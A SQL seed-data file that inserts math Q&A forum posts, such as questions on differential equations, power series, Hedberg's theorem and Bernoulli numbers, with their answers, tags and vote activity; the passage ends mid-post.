INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (106, 106, 6, 'Create');
INSERT INTO tag (text) VALUES ('differential-geometry');
INSERT INTO questiontag (question_id, tag_id) VALUES (106, 115);
INSERT INTO tag (text) VALUES ('manifolds');
INSERT INTO questiontag (question_id, tag_id) VALUES (106, 116);
INSERT INTO activity (post_id, user_id, action) VALUES (106, 6, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (106, 6, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (106, 6, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (106, 6, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (107, 28, '&lt;p&gt;How can i show that &quot;a partial order on a finite set is uniquely determined by its covering relation&quot;?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (107, 2, 'covering relation question.');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (107, 107, 28, 'Create');
INSERT INTO tag (text) VALUES ('combinatorics');
INSERT INTO questiontag (question_id, tag_id) VALUES (107, 117);
INSERT INTO tag (text) VALUES ('relations');
INSERT INTO questiontag (question_id, tag_id) VALUES (107, 118);
INSERT INTO tag (text) VALUES ('relation-algebra');
INSERT INTO questiontag (question_id, tag_id) VALUES (107, 119);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (108, 8, '&lt;p&gt;I have a differential equation here:&lt;/p&gt;

&lt;p&gt;$$\frac{dy}{dx} = \frac{4y-3x}{2x-y}$$&lt;/p&gt;

&lt;p&gt;This equation can be solved relatively easily by dividing through by $x$, and then doing a $y=vx$ substitution (making the equation separable).&lt;/p&gt;

&lt;p&gt;However, my question is: can this be solved by taking a Laplace transform instead?&lt;/p&gt;

&lt;p&gt;When I try to do so, I get this:
$$\mathscr{L}(2ty&#x27;) - \mathscr{L}(yy&#x27;) = \mathscr{L}(4y) - \mathscr{L}(3t)$$&lt;/p&gt;

&lt;p&gt;The RHS is fairly simple when it comes to a laplace transform. On the LHS, I believe that the $2ty&#x27;$ term can be translated to something like $-F&#x27;(s)$. But that second term is causing me a bit of trouble.&lt;/p&gt;

&lt;p&gt;Can a Laplace transform even be taken for such an equation? I feel that it should, I&#x27;m just not quite sure how, the integral ends up being quite messy. If so, could you show me how? (and if not, why not?)&lt;/p&gt;

&lt;p&gt;Additionally, I&#x27;d like to know how to best select a method to solve a differential equation. In the case of this one, clearly, the easiest way would be doing a substitution. But how do I know that would be the most efficient way?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (108, 2, 'Method Selection for Solving Differential Equations');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (108, 108, 8, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (108, 102);
INSERT INTO tag (text) VALUES ('laplace-transform');
INSERT INTO questiontag (question_id, tag_id) VALUES (108, 120);
INSERT INTO activity (post_id, user_id, action) VALUES (108, 8, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (108, 8, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (108, 8, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (109, 5, '&lt;p&gt;How to calculate real fourier transform of real data instead of complex data in mathlab? Is there any software to test real fft?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (109, 2, 'Real Fourier Transform In Matlab');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (109, 109, 5, 'Create');
INSERT INTO tag (text) VALUES ('fourier-analysis');
INSERT INTO questiontag (question_id, tag_id) VALUES (109, 121);
INSERT INTO tag (text) VALUES ('fourier-series');
INSERT INTO questiontag (question_id, tag_id) VALUES (109, 122);
INSERT INTO tag (text) VALUES ('fourier-transform');
INSERT INTO questiontag (question_id, tag_id) VALUES (109, 123);
INSERT INTO tag (text) VALUES ('fast-fourier-transform');
INSERT INTO questiontag (question_id, tag_id) VALUES (109, 124);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (110, 41, '&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;My problem&lt;/strong&gt;: I should calculate this sum: $\sum_{n=0}^{\infty} nx^{2n+1}$.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;My solution&lt;/strong&gt;: $\;$$ x \sum_{n=0}^{\infty} nx^{2n}$,&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Substitution: $x^2 = y$&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then $\;$$ y^{1/2} \sum_{n=0}^{\infty} ny^{n}$, ...&lt;/p&gt;

&lt;p&gt;Now I would focus just on $\;$$ \sum_{n=0}^{\infty} ny^{n} =  y\sum_{n=0}^{\infty} ny^{n-1}$$, $&lt;/p&gt;

&lt;p&gt;Because $\;$$ \sum_{n=0}^{\infty} y^{n} = 1/(1-y)$&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So $   \sum_{n=0}^{\infty} ny^{n-1} = 1/ (1-y)^2$&lt;/p&gt;

&lt;p&gt;Finally $y^{1/2}\sum_{n=0}^{\infty} ny^{n-1} = y^{1/2}/ (1-y)^2 = x/(1-x^2)^2$&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (110, 2, 'Evaluating a sum: $\sum_{n=0}^{\infty} nx^{2n+1}$');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (110, 110, 41, 'Create');
INSERT INTO tag (text) VALUES ('calculus');
INSERT INTO questiontag (question_id, tag_id) VALUES (110, 125);
INSERT INTO questiontag (question_id, tag_id) VALUES (110, 97);
INSERT INTO tag (text) VALUES ('power-series');
INSERT INTO questiontag (question_id, tag_id) VALUES (110, 126);
INSERT INTO activity (post_id, user_id, action) VALUES (110, 41, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (111, 3, '&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/rtGuh.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/rtGuh.png&quot; alt=&quot;The problem&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Update my lagrangian is &lt;/p&gt;

&lt;p&gt;$$L=\frac{ml^2}2\left(\dot \theta_1^2+\frac 13\dot \theta_2^2+\dot \theta_1\dot \theta_2\cos\delta\right)+mgl(cos\theta_1+\frac 12\cos\theta_2)$$&lt;/p&gt;

&lt;p&gt;and for my linearised equations of motion question (5) i got the following &lt;/p&gt;

&lt;p&gt;$$(\ddot \theta_1) +\frac{2}{3}\ddot\theta_2=\frac{-2g}{l}\theta_2$$&lt;/p&gt;

&lt;p&gt;and $$2\ddot \theta_1 +\ddot \theta_2=\frac{-2g}{l}\theta_1$$&lt;/p&gt;

&lt;p&gt;These seem to give numerically unpleasant normal mode frequencies though, so I&#x27;m not entirely sure that they&#x27;re right, maybe i went wrong on calculating the equations of motion. a futher solution would be ideal. Thanks &lt;/p&gt;

&lt;p&gt;my differentials were &lt;/p&gt;

&lt;p&gt;$$\frac{dL}{d\theta_1}=-\frac{ml^2}{2}\dot\theta_1\dot\theta_2\cos(\theta_1)sin(\theta_2)-\frac{ml^2}{2}\dot\theta_1\dot\theta_2\sin(\theta_1)\cos(\theta_2)-mgl\sin(\theta_1)$$&lt;/p&gt;

&lt;p&gt;$$\frac{dL}{d\theta_2}=-\frac{ml^2}{2}\dot\theta_1\dot\theta_2\cos(\theta_1)\sin(\theta_2)+\frac{ml^2}{2}\dot\theta_1\dot\theta_2\sin(\theta_1)\cos(\theta_2)-\frac{mgl}{2}\sin(\theta_2)$$&lt;/p&gt;

&lt;p&gt;$$\frac{dL}{d\dot\theta_1}=ml^2\dot\theta_1+\frac{ml^2}{2}\dot\theta_2\cos(\theta_2-\theta_1)$$&lt;/p&gt;

&lt;p&gt;and finally $$\frac{dL}{d\dot\theta_2}=\frac{ml^2}{3}\dot\theta_2+\frac{ml^2}{2}\dot\theta_1\cos(\theta_2-\theta_1)$$&lt;/p&gt;

&lt;p&gt;so the two equations of motion are &lt;/p&gt;

&lt;p&gt;$$ml^2\ddot\theta_1+\frac{ml^2}{2}\dot\theta_1\dot\theta_2\cos(\theta_1)sin(\theta_2)+\frac{ml^2}{2}\dot\theta_1\dot\theta_2\sin(\theta_1)\cos(\theta_2)+mgl\sin(\theta_1)=0$$&lt;/p&gt;

&lt;p&gt;and $$\frac{ml^2}{3}\ddot\theta_2+\frac{ml^2}{2}\dot\theta_1\dot\theta_2\cos(\theta_1)\sin(\theta_2)-\frac{ml^2}{2}\dot\theta_1\dot\theta_2\sin(\theta_1)\cos(\theta_2)+\frac{mgl}{2}\sin(\theta_2)=0$$&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (111, 2, 'Pendulum problem inertia');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (111, 111, 3, 'Create');
INSERT INTO tag (text) VALUES ('dynamical-systems');
INSERT INTO questiontag (question_id, tag_id) VALUES (111, 127);
INSERT INTO tag (text) VALUES ('classical-mechanics');
INSERT INTO questiontag (question_id, tag_id) VALUES (111, 128);
INSERT INTO tag (text) VALUES ('euler-lagrange-equation');
INSERT INTO questiontag (question_id, tag_id) VALUES (111, 129);
INSERT INTO activity (post_id, user_id, action) VALUES (111, 3, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (112, 37, '&lt;p&gt;I&#x27;m looking to find inner and outer solutions to this ODE and to do some matching $$\epsilon \ddot y + (1+t) \dot y = 0 \;\;\;\;\; y(0) = 0 \;\; \dot y (0) = \frac1\epsilon$$&lt;/p&gt;

&lt;p&gt;So I understand I need to convert to a new time variable $\tau = \frac t\epsilon$ ($\dot y$ and $y&#x27;$ are $\frac{dy}{dt}$ and $\frac{dy}{d\tau}$ respectively), which I plug in to get&lt;/p&gt;

&lt;p&gt;$$y&#x27;&#x27;+(1+\epsilon \tau)y&#x27; =0 \;\;\;\;\; y(0) = 0 \;\; y&#x27; (0) = 1$$&lt;/p&gt;

&lt;p&gt;So if I plug in $y^i=y_0^i + \epsilon y_1^i$ to the $\tau$ equation and solve I get $y^i = 1-e^{-t}+\epsilon(1-e^{-t}(1-t-\frac{t^2}2))$.&lt;/p&gt;

&lt;p&gt;When I plug in $y^o=y_0^o + \epsilon y_1^o$ to the $t$ equation and solve ignoring the boundary conditions I just get a constant. So $y^o = c+\epsilon d$. &lt;/p&gt;

&lt;p&gt;Now to apply Van Dyke matching rules. Express $y^i$ in terms of $\tau$ to get $y^{io}=1-e^{-\epsilon\tau}+\epsilon(1-e^{-\epsilon\tau})$ plus higher order terms. $1-e^{-\epsilon\tau}$ goes to zero, so the whole thing is zero. $y^{oi}=y^{o}$ since it&#x27;s constant, so equating them I just get zero.&lt;/p&gt;

&lt;p&gt;Something seems wrong. Is zero really the best approximation available here? Where did I go wrong?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (112, 2, 'Matching inner and outer solutions gives me zero');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (112, 112, 37, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (112, 102);
INSERT INTO questiontag (question_id, tag_id) VALUES (112, 112);
INSERT INTO tag (text) VALUES ('perturbation-theory');
INSERT INTO questiontag (question_id, tag_id) VALUES (112, 130);
INSERT INTO activity (post_id, user_id, action) VALUES (112, 37, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (113, 33, '&lt;p&gt;Consider the system
$$
x&#x27;=x², y&#x27;=y
$$
and find the local unstable manifold of the equilibrium $(0,0)$.&lt;/p&gt;

&lt;p&gt;The linearization matrix is
$$
A=\begin{pmatrix}0 &amp;amp; 0\\0 &amp;amp; 1\end{pmatrix},
$$
hence the eigenvalues are $\lambda_1=0$ and $\lambda_2=1$.&lt;/p&gt;

&lt;p&gt;The unstable space is spanned by the eigenvector belonging to $\lambda_2$, say $v=(0,1)$. Hence the $y$-axis should be the unstable space.&lt;/p&gt;

&lt;p&gt;But what is the unstable manifold? Its tangent to the y-axis in $(0,0)$?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (113, 2, 'Local unstable manifold');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (113, 113, 33, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (113, 102);
INSERT INTO questiontag (question_id, tag_id) VALUES (113, 116);
INSERT INTO questiontag (question_id, tag_id) VALUES (113, 127);
INSERT INTO activity (post_id, user_id, action) VALUES (113, 33, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', -1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (114, 11, '&lt;p&gt;I have come across a question when researching integral substitution and I have no idea how to do it. Any help would be greatly appreciated as I don&#x27;t understand what to do. &lt;/p&gt;

&lt;p&gt;$$\int \text{csc}^2 2\theta \cot2\theta \,d\theta $$&lt;/p&gt;

&lt;p&gt;I need to do the integral in two ways by using two different substitutions: $u = \cot 2\theta$ and $u = \text{csc } 2\theta$&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (114, 2, 'Integral Substitution $\text{csc }\theta \cot\theta$');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (114, 114, 11, 'Create');
INSERT INTO tag (text) VALUES ('integration');
INSERT INTO questiontag (question_id, tag_id) VALUES (114, 131);
INSERT INTO tag (text) VALUES ('substitution');
INSERT INTO questiontag (question_id, tag_id) VALUES (114, 132);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (115, 25, '&lt;p&gt;In type theory and constructive mathematics, Hedberg&#x27;s theorem says:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;A type with decideable equality is automatically a set.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But coming at it from a classical viewpoint, I don&#x27;t understand how this could be true. If I understand correctly, the word &quot;type&quot; in this context basically means &quot;$\infty$-groupoid.&quot; Okay, so consider the delooping $G$ of the group $\mathbb{Z}/2\mathbb{Z}.$ It follows that $G$ is the groupoid with one object and two automorphisms. Since there&#x27;s only one object, equality of objects is decidable. And since there exist parallel morphisms that aren&#x27;t equal, $G$ is not a set.&lt;/p&gt;

&lt;p&gt;What am I not understanding here?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (115, 2, 'What am I not understanding about Hedberg&#39;s theorem?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (115, 115, 25, 'Create');
INSERT INTO tag (text) VALUES ('soft-question');
INSERT INTO questiontag (question_id, tag_id) VALUES (115, 133);
INSERT INTO tag (text) VALUES ('homotopy-theory');
INSERT INTO questiontag (question_id, tag_id) VALUES (115, 134);
INSERT INTO tag (text) VALUES ('foundations');
INSERT INTO questiontag (question_id, tag_id) VALUES (115, 135);
INSERT INTO tag (text) VALUES ('constructive-mathematics');
INSERT INTO questiontag (question_id, tag_id) VALUES (115, 136);
INSERT INTO tag (text) VALUES ('type-theory');
INSERT INTO questiontag (question_id, tag_id) VALUES (115, 137);
INSERT INTO activity (post_id, user_id, action) VALUES (115, 25, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (116, 4, '&lt;p&gt;I was trying to understand Bernoulli numbers. When I googled, I found &lt;a href=&quot;http://wstein.org/edu/fall05/168/projects/kevin_mcgown/bernproj.pdf&quot; rel=&quot;nofollow noreferrer&quot;&gt;this link&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;It starts by saying that, The Bernoulli numbers are defined via the coefficients of the power series expansion of 
$\frac{t}{e^{t}-1}$,&lt;/p&gt;

&lt;p&gt;then they write the expansion,for $m \geq 0$.&lt;/p&gt;

&lt;p&gt;$\frac{t}{e^{t}-1} = \sum_{m=0}^{\infty} \frac{B_m}{m!}t^{m}$ (1)&lt;/p&gt;

&lt;p&gt;Then, the tutorial says that we multiply both sides by $(e^{t} -1)$ and get &lt;/p&gt;

&lt;p&gt;$B_0=1$, &lt;/p&gt;

&lt;p&gt;$B_m= -\frac{1}{m+1}\sum_{k=0}^{m-1}\binom{m+1}{k}B_k$. (2)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How is this happening?&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;I tried doing this with hand and I get a recursive relation, that looks like, &lt;/p&gt;

&lt;p&gt;$\frac{t}{e^{t}-1} = \sum_{m=0}^{\infty} \frac{B_m}{m!}t^{m}$&lt;/p&gt;

&lt;p&gt;$\implies t = e^{t}\sum_{m=0}^{\infty} \frac{B_m}{m!}t^{m} - \sum_{m=0}^{\infty} \frac{B_m}{m!}t^{m}$&lt;/p&gt;

&lt;p&gt;$\implies t = e^{t}\sum_{m=0}^{\infty} \frac{B_m}{m!}t^{m} - \frac{t}{e^{t}-1}$&lt;/p&gt;

&lt;p&gt;What next?&lt;/p&gt;

&lt;p&gt;How do I get to (2)? &lt;/p&gt;

&lt;p&gt;I am new to number theory, please excuse me if the doubt is very basic. Any kind of help will be appreciated. :)&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (116, 2, 'How do we get the final formula of the Bernoulli number?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (116, 116, 4, 'Create');
INSERT INTO tag (text) VALUES ('number-theory');
INSERT INTO questiontag (question_id, tag_id) VALUES (116, 138);
INSERT INTO tag (text) VALUES ('intuition');
INSERT INTO questiontag (question_id, tag_id) VALUES (116, 139);
INSERT INTO tag (text) VALUES ('proof-explanation');
INSERT INTO questiontag (question_id, tag_id) VALUES (116, 140);
INSERT INTO tag (text) VALUES ('bernoulli-numbers');
INSERT INTO questiontag (question_id, tag_id) VALUES (116, 141);
INSERT INTO activity (post_id, user_id, action) VALUES (116, 4, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (116, 4, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (117, 27, '&lt;p&gt;In your case (symmetric matrix) the matrix can be diagonalized and the exponential be computed:&lt;/p&gt;

&lt;p&gt;$A = U D U^T$&lt;/p&gt;

&lt;p&gt;with a orthogonal matrix $U$ and diagonal matrix $D$ containing the eigenvalues of A.&lt;/p&gt;

&lt;p&gt;Since then&lt;/p&gt;

&lt;p&gt;$e^{At} = U e^{Dt} U^T$&lt;/p&gt;

&lt;p&gt;we get&lt;/p&gt;

&lt;p&gt;$||e^{At}|| = ||e^{Dt}||$&lt;/p&gt;

&lt;p&gt;Since the matrix norm $||M||_2$ is the maximum absolute eigenvalue of a symmetric matrix $M$ we have in fact&lt;/p&gt;

&lt;p&gt;$||e^{At}|| = \max_i( e^{\lambda_i}) = e^{||D||t} = e^{||A||t}$&lt;/p&gt;

&lt;p&gt;Does this make sense?&lt;/p&gt;

&lt;p&gt;I guess the property $||e^{At}|| = e^{||A||t}$ holds for any normal matrix, but for the non-normal case it is probably false.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (117, 89, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (117, 27, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (118, 44, '&lt;p&gt;&lt;em&gt;Yes that&#x27;s true:&lt;/em&gt; More generally, the property holds for &lt;em&gt;affine&lt;/em&gt; morphisms, see e.g. &lt;a href=&quot;http://stacks.math.columbia.edu/tag/01X8&quot; rel=&quot;nofollow noreferrer&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (118, 92, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (118, 44, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (118, 44, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (119, 1, '&lt;p&gt;Since the string consisting of $100$ times &quot;$100$&quot; has $300$ (decimal) digits, we have $$10^{299}&amp;lt; \underbrace{100100\cdots 100100}_{100\ times\ &quot;100&quot;}&amp;lt;10^{300}$$ hence the integer part of the decimal logarithm is $299$&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (119, 93, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (119, 1, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (120, 48, '&lt;p&gt;This is best answered using graph theory, in my opinion.&lt;/p&gt;

&lt;p&gt;Let $G$ be a directed graph where the nodes are all possible three-digit codes. For two vertices $u, v$ there is an edge from $u$ to $v$ if the two last digits of $u$ are the two first digits of $v$. That way there are edges from $123$ to each of $231, 232, 233, 234, 235, 236, 237, 238, 239, 230$ and no others.&lt;/p&gt;

&lt;p&gt;The nodes each represent the last three button presses. As you press digits on the keypad, you move along the graph. Once you&#x27;ve pressed three buttons for the first time, you have chosen the node corresponding to the three numbers you pressed. For each successive button you press, you move along an edge to the node representing the current three last key presses. That way, each edge represents a specific four-digit code, and each four digit code is represented (for instance, $1234$ is the edge that goes from $123$ to $234$, and $1111$ is the edge that goes form the vertex $111$ and in a loop back to $111$).&lt;/p&gt;

&lt;p&gt;This is a so-called &lt;a href=&quot;https://en.wikipedia.org/wiki/De_Bruijn_graph&quot; rel=&quot;nofollow noreferrer&quot;&gt;De Bruijn graph&lt;/a&gt;, and they are well known (and easily checked) to be Eulerian directed graphs. That means that there is a route that goes along each edge exactly once. This corresponds to each code being attempted exactly once, which is clearly as effective as it gets.&lt;/p&gt;

&lt;p&gt;This means that the number of required button presses is $3 + 10000$, where the first $3$ are for picking a starting node, and the remaining $10000$ are for testing actual codes, one by one.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (120, 94, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (120, 48, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (121, 10, '&lt;p&gt;I have al little question about classification problem. If I want to convert my regression problem into a classification problem I have to categorize also the input variables or just the y? 
sorry for my bad english (correct me xD)&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (121, 96, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (121, 10, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (122, 16, '&lt;p&gt;$\frac{d^2x(t)}{dt^2} +\omega^2x(t)+\nu \frac{dx(t)}{dt}=f_0cos(\Omega t)$&lt;/p&gt;

&lt;p&gt;Let $x(t) = A\cos(\Omega t) + B\sin(\Omega t)$&lt;/p&gt;

&lt;p&gt;$\implies x&#x27;(t) = -A\Omega\sin(\Omega t)+ B\Omega\cos(\Omega t)$&lt;/p&gt;

&lt;p&gt;$x&#x27;&#x27;(t) = -A\Omega^2\cos(\Omega t) -B\Omega^2\sin(\Omega t)$&lt;/p&gt;

&lt;p&gt;Subbing this in:&lt;/p&gt;

&lt;p&gt;$$-A\Omega^2\cos(\Omega t) -B\Omega^2\sin(\Omega t)+A\omega^2\cos(\Omega t)+B\omega^2\sin(\Omega t) + \nu B\Omega \cos(\Omega t) -\nu A\Omega\sin(\Omega t) = f_{0}\cos(\Omega t)$$&lt;/p&gt;

&lt;p&gt;Comparing $\cos(\Omega t)$:&lt;/p&gt;

&lt;p&gt;$-A\Omega^2+A\omega^2+\nu B\Omega = f_{0}$&lt;/p&gt;

&lt;p&gt;Comparing $\sin(\Omega t):$&lt;/p&gt;

&lt;p&gt;$-B\Omega^2+B\omega^2-\nu A\Omega = 0$&lt;/p&gt;

&lt;p&gt;Now simultaneously solve for $A$ and $B$&lt;/p&gt;

&lt;p&gt;$A = \frac{B(\omega^2-\Omega^2)}{\Omega\nu}$&lt;/p&gt;

&lt;p&gt;$ \frac{B(\omega^2-\Omega^2)}{\Omega\nu}(\omega^2-\Omega^2)+B\nu\Omega = f_{0}$&lt;/p&gt;

&lt;p&gt;$B[(\omega^2-\Omega^2)^2+\nu^2\Omega^2]=f_{0}\nu\Omega$&lt;/p&gt;

&lt;p&gt;$B=\frac{f_{0}\nu\Omega}{(\omega^2-\Omega^2)^2+\nu^2\Omega^2}$&lt;/p&gt;

&lt;p&gt;and $A= \frac{f_{0}\nu\Omega}{(\omega^2-\Omega^2)^2+\nu^2\Omega^2}\cdot \frac{\omega^2-\Omega^2}{\Omega \nu}$=$\frac{f_{0}(\omega^2-\Omega^2)}{(\omega^2-\Omega^2)^2+\nu^2\Omega^2}$&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (122, 97, 'True');
INSERT INTO activity ( post_id, user_id, action) VALUES (122, 16, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (122, 16, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (122, 16, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (123, 23, '&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Divergence_theorem&quot; rel=&quot;nofollow noreferrer&quot;&gt;According to the Divergence Theorem, the surface integral of a vector field over a &quot;simple&quot; and closed &lt;/a&gt; surface equals the volume integral of the divergence of the same  over thesolid defined by the surface.&lt;/p&gt;

&lt;p&gt;Since the divergence given is constant, the integral of its divergence equals the divergence times the volume of the solid. $V=5^2\cdot2\cdot \pi=50\pi$. So, the surface integral has to equal $4\cdot 50\pi=200\pi.$&lt;/p&gt;

&lt;p&gt;I don&#x27;t think that the rotating nature of the cylinder counts. (If ibeing massive or is rotating about its vertical axis of symmetry. If it behaves another way then the problem is not defined.) The cylinder determines the same body even if rotating or if hollow.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (123, 98, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (123, 23, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (124, 14, '&lt;p&gt;Differentiate with respect to $x$ ? On the left you have simply $f&#x27;(x)$ and on the right you have polynomial in $x$ ($a$ is a constant with respect to the derivative in $x$), so you get
$$0+f&#x27;(a)+f&#x27;&#x27;(a)(x-a)+\frac{f&#x27;&#x27;&#x27;(x)}{2}(x-a)^2$$.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (124, 99, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (124, 14, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (125, 45, '&lt;p&gt;What you missed is the fact that generally $$G(z^{-1})\neq G^{-1}(z)$$
So the inverse of the system $G(z)$ is $G^{-1}(z)$ since clearly $G(z) \cdot G^{-1}(z)=G(z)\cdot \frac{1}{G(z)}=1$ which is the identity system.&lt;/p&gt;

&lt;p&gt;However, $G(z^{-1})$ means all the poles and zeros in $G(z)$ are inverted. So for example if $G(z)=\frac{z-z_0}{z-p_0}$ (with a pole $p_0$ and a zero $z_0$), then $G(z^{-1})=\frac{z^{-1}-z_0}{z^{-1}-p_0}$, whose poles and zeros are $\frac{1}{p_0}$ and $\frac{1}{z_0}$.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (125, 102, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (125, 45, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (125, 45, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (126, 9, '&lt;p&gt;The first line : (&#x27;canonical identification&#x27;) means we say that an element of $T_I(GL(n,\mathbb{R}))$ can be thought of as an element of $M_n(\mathbb{R})$ and vice versa by means of vectorization.&lt;br&gt;&lt;br&gt; &lt;/p&gt;

&lt;p&gt;Here an example for $n=2$ :&lt;/p&gt;

&lt;p&gt;Let : $Q \in T_I(GL(2,\mathbb{R})) $ , $Q= \left(
\begin{array}{c}
q_1 \\
q_2 \\
q_3 \\
q_4 \\
\end{array}
\right)$ , &lt;br&gt;the corresponding matrix $\in M_2(\mathbb{R})$ becomes : $ \left(
\begin{array}{c , c}
q_1 &amp;amp; q_3 \\
q_2  &amp;amp; q_4 \\
\end{array}
\right)$.&lt;br&gt;&lt;br&gt;&lt;br&gt;
To make a vector field from a vector at $T_I$ we have to assign a vector to every element of $GL(n,\mathbb{R})$. &lt;br&gt; We choose to do so by &#x27;left-multiplying&#x27; with said element of $GL(n,\mathbb{R})$ which we have called $P$ . &lt;br&gt;So in coordinates, $P$ is in fact just : $\left(
\begin{array}{c}
x_1 \\
x_2 \\
x_3 \\
x_4 \\
\end{array}
\right)$ or $\left(
\begin{array}{c , c}
x_1 &amp;amp; x_3 \\
x_2  &amp;amp; x_4 \\
\end{array}
